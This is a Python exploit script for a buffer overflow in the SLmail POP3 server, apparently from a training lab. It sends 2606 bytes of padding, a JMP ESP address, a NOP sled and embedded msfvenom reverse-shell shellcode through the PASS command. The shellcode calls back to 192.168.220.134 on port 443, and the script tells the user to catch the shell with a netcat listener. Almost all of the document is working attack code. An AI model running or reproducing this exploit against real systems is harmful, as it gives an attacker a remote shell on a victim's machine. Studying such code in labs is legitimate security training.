# final exploitation script

#!/usr/bin/python
# coding=utf-8

import time, struct, sys
import socket as so


hacked = (        
"    | | | |          | |             __    _    __    _ \n"
"    | |_| | __ _  ___| | __  	    /  '  / \  |  )  / \ \n"
"    |  _  |/ _` |/ __| |/ /  	    \__  |___| |__/ |___| \n"
"    | | | | (_| | (__|   (  ______     \ |===| |  \ |===| \n"
"    |_| |_|\__,_|\___|_|\_\  WITH   \__/ |   | |__) |   | \n\n")

achars = 'A'*2606

jmpesp = '\x8f\x35\x4a\x5f'		#JMP ESP address is  ==> 5F4A358F

nops = '\x90'*16			#NOP Sled

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.220.134 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT
# Shell code for exploitation                                                                      

buf = b"\xbb\x82\xb1\x51\xeb\xd9\xcc\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x52\x83\xef\xfc\x31\x5f\x0e\x03\xdd\xbf\xb3"
buf += b"\x1e\x1d\x57\xb1\xe1\xdd\xa8\xd6\x68\x38\x99\xd6\x0f"
buf += b"\x49\x8a\xe6\x44\x1f\x27\x8c\x09\x8b\xbc\xe0\x85\xbc"
buf += b"\x75\x4e\xf0\xf3\x86\xe3\xc0\x92\x04\xfe\x14\x74\x34"
buf += b"\x31\x69\x75\x71\x2c\x80\x27\x2a\x3a\x37\xd7\x5f\x76"
buf += b"\x84\x5c\x13\x96\x8c\x81\xe4\x99\xbd\x14\x7e\xc0\x1d"
buf += b"\x97\x53\x78\x14\x8f\xb0\x45\xee\x24\x02\x31\xf1\xec"
buf += b"\x5a\xba\x5e\xd1\x52\x49\x9e\x16\x54\xb2\xd5\x6e\xa6"
buf += b"\x4f\xee\xb5\xd4\x8b\x7b\x2d\x7e\x5f\xdb\x89\x7e\x8c"
buf += b"\xba\x5a\x8c\x79\xc8\x04\x91\x7c\x1d\x3f\xad\xf5\xa0"
buf += b"\xef\x27\x4d\x87\x2b\x63\x15\xa6\x6a\xc9\xf8\xd7\x6c"
buf += b"\xb2\xa5\x7d\xe7\x5f\xb1\x0f\xaa\x37\x76\x22\x54\xc8"
buf += b"\x10\x35\x27\xfa\xbf\xed\xaf\xb6\x48\x28\x28\xb8\x62"
buf += b"\x8c\xa6\x47\x8d\xed\xef\x83\xd9\xbd\x87\x22\x62\x56"
buf += b"\x57\xca\xb7\xf9\x07\x64\x68\xba\xf7\xc4\xd8\x52\x1d"
buf += b"\xcb\x07\x42\x1e\x01\x20\xe9\xe5\xc2\x8f\x46\x39\x94"
buf += b"\x78\x95\xc1\x98\xc3\x10\x27\xf0\x23\x75\xf0\x6d\xdd"
buf += b"\xdc\x8a\x0c\x22\xcb\xf7\x0f\xa8\xf8\x08\xc1\x59\x74"
buf += b"\x1a\xb6\xa9\xc3\x40\x11\xb5\xf9\xec\xfd\x24\x66\xec"
buf += b"\x88\x54\x31\xbb\xdd\xab\x48\x29\xf0\x92\xe2\x4f\x09"
buf += b"\x42\xcc\xcb\xd6\xb7\xd3\xd2\x9b\x8c\xf7\xc4\x65\x0c"
buf += b"\xbc\xb0\x39\x5b\x6a\x6e\xfc\x35\xdc\xd8\x56\xe9\xb6"
buf += b"\x8c\x2f\xc1\x08\xca\x2f\x0c\xff\x32\x81\xf9\x46\x4d"
buf += b"\x2e\x6e\x4f\x36\x52\x0e\xb0\xed\xd6\x3e\xfb\xaf\x7f"
buf += b"\xd7\xa2\x3a\xc2\xba\x54\x91\x01\xc3\xd6\x13\xfa\x30"
buf += b"\xc6\x56\xff\x7d\x40\x8b\x8d\xee\x25\xab\x22\x0e\x6c"
                 

 

overflow = achars + jmpesp + nops + buf 	# formatted buffer string

try:
   server = str(sys.argv[1])			# Target IP
   port = int(sys.argv[2])			# Targt Port
except IndexError:
   print "[+] Usage example: python %s 192.168.220.134 110" % sys.argv[0]
   print "Make sure to use netcat first. Example: nc -nlvp 443"
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER Hsaba' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + overflow + '\r\n')
   print "\n[+] Completed. Check netcat for shell."
   print ("\033[1;32;48m")
   print hacked
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
